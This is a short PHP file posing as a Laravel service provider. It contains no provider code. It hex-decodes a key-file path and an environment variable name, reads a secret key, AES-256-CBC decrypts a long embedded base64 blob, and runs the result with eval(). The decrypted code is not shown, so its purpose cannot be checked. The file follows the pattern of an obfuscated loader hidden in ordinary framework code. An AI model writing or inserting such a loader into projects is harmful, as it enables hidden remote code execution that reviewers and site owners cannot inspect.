<?php
namespace App\Providers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('6JC86w+YQgHig93ycKNTRA==');

$c=base64_decode(

'1IUpOpigQQ5E5sNGe3umvj7rGJ62vuR8kglIKJ9sutUxy6Yib+9Oh5p6DD7z8FB11l6d0qKFRli+' .
'mM4X2eZS+P6AmhzotDHw+PKuRHB/hOURRvIxcgIb8G94JYoisOTrs+e6NeqCGWPpb+MFwmaNhTv0' .
'ssk49j8x3a8njcxIxxRpcwB81b52Uoto439cZEoRUNhVixNE4COb6k4pQPZVS9FpGo/8IIbW7+BV' .
'Gqk95rcVT/pV2tSe/QIk4EtvKgkOZ6jIOVzrpWBf2Ty/iuh+jA56cxxe/YepxytTeLUnbOWLHWfD' .
'JEe4C4oInngLaW79/S3yTHfydjxLZBGeix93o3LJVS0pR7V8SsCTRVxuxWGzu/Qwsbwd3NiuhsNJ' .
'BegbwrP74RN9aJ5t2eJ+QdT39HkQRVKmQiBjFcVMrZVoI1yh/vbfcz5/zEalyKFiqXt2TdOHPUxw' .
'p1TXVRiSKZFKy5pwvXtpK4FycR37vyPTfT79KueVAvJZqEttJ4a6/in1SDGEKCCk3vPWngH4g6dp' .
'CZ2NIT7Hm1wTW7AsVHKdIcLYpptsfp6fD0FJQUQdCbPGmHPu/VH1yBVRQL8WELg5GWwb0Vg00ACP' .
'mCOs5UzyvMCwPD+SmOTvQRHDBXKBQI/jTR45LpMJQz8zDms1aGP5LPmCkkvAQr0uddfLvBaSHoR3' .
'Yk7XFZc/RJ6u1lXR9pIQ1lGaRf1MtdVDZ0PTKkbJ0hHDzrEsf52NoY9GUOqc8xBMrul52T1Bq7aG' .
'W4DwlNSxYJ/Zh2OCTclWfmASYmbFsGAgh+gutxjP0yuZzVjDNs4WYJnkOWUk5UUoOfn5EA2Qa236' .
'FuSwXFbx6DOuHDnk9ft/3TWzd+svGfld9BU6TDvtevdKdcYiWX9fwuAx5R+1nsAgbBIPTL/7iCNn' .
'6RzZv7m0B+1xjbSJ1UEoxZkldfcpjEd+CP03VW7jQjKsFTldc19OGvFbKlvjWBC2jKXXjV0XddYz' .
'XWQDthWHhRnBdoy0EzDlu6wGf23m1xky9YRBTZqyCO8n0LoUInOPPdMqvourYMVBmNiK96iAmu6n' .
'qqvdo2tq5GOsGXn1AMQ66S2+4syMtoLrLY+qsnhZ6nYYg4FeiWCCGkueUKyoudYuNluQvbUVtLyo' .
'24AkoPYmxr8LB0fcTQFisYYur0PozPt4CpFcRlHy+hRxyFuJtMNMKSIHALSVcjI6yJoqXjN8l9pV' .
'xsc6sZRzDP66nWctZTtt0lpymw4sP+kBt18I5f7YjHfR6PYsS+oGkY/H8I4MqGq94L4cehfhQnR5' .
'HBkDWoAq2AlFy8kVzm32/GCnMA9nLPrYCC0IhXudRaOqq6c+n92O9qOOCby9NgdaElawc8XSJNcI' .
'vd2oKIgu4wMxsSkVsmEw1/fsoqRsry6MPqfoBj+V2AFgEaFyTGM2l77oaNetpnKBlNwbwfyTDBE0' .
'TpJATb0WMzTMPBk/OBJCQVAFWZ+R3rPdRDshXva5COkytscFu2wKDsC/QN2CKjCzP3NbM/qBBK9H' .
'1d6xL2J+dprANfA5zGz+7lBU/NDmjS3DjwyyTKG2afAfAm8bHZ6g+ZY+AJ8Q9vJhEYbd6vt1NDeN' .
'BVjMxduIg958qCIuldjiSZw9E3AWqsU8xdP2jQGMt5wZyKM='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

